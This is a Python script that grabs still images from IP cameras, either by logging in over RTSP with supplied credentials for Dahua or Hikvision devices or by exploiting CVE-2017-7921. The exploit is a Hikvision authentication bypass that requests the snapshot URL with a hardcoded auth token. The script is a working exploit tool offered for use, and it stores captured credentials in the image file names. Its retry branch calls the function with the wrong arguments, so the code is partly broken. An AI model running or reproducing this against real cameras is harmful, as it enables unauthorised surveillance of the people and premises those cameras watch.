"""Some tools about camera"""
import os
import sys
import rtsp
import requests
import argparse
from PIL import Image


def get_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str, required=True)
    parser.add_argument('--port', type=str, required=True)
    parser.add_argument('--user', type=str, required=True)
    parser.add_argument('--passwd', type=str, required=True)
    parser.add_argument('--device', type=str, required=True)
    parser.add_argument('--vulnerability', type=str, required=True)
    parser.add_argument('--sv_path', type=str, required=True)

    args = parser.parse_args()
    return args


def save_snapshot(args) -> None:
    """select diff func to save snapshot"""
    snapshot_path = os.path.join(args.sv_path, 'snapshots')
    if not os.path.exists(snapshot_path):
        os.mkdir(snapshot_path)

    camera_info = [args.ip, args.port, args.user, args.passwd, args.device, args.vulnerability]
    try:
        # user & passwd (Dahua / Hikvision)
        if camera_info[2] and camera_info[3] and (camera_info[4] == 'Dahua' or camera_info[4] == 'Hikvision'):
            snapshot_rtsp(*camera_info[:4], snapshot_path)
        # cve-2017-7921
        if camera_info[-1] == 'cve-2017-7921':
            snapshot_cve_2017_7921(camera_info[0], camera_info[1], snapshot_path)
    except Exception as e:
        pass


def snapshot_rtsp(ip, port, user, passwd, sv_path):
    """get snapshot through rtsp"""
    with rtsp.Client(rtsp_server_uri=f"rtsp://{user}:{passwd}@{ip}:554", verbose=False) as client:
        while client.isOpened():
            img = client.read(raw=True)
            if not img is None:
                name = f"{ip}:{port}-{user}-{passwd}.jpg"
                img = Image.fromarray(img)
                img.save(os.path.join(sv_path, name))
                break


def snapshot_cve_2017_7921(ip, port, sv_path):
    r = requests.get(f"http://{ip}/onvif-http/snapshot?auth=YWRtaW46MTEK", timeout=3)
    if r.status_code == 200:
        name = f"{ip}:{port}-cve_2017_7921.jpg"
        with open(os.path.join(sv_path, name), 'wb') as f:
            f.write(r.content)
    else: snapshot_cve_2017_7921(ip, sv_path)


if __name__ == '__main__':
    args = get_parser()
    save_snapshot(args)
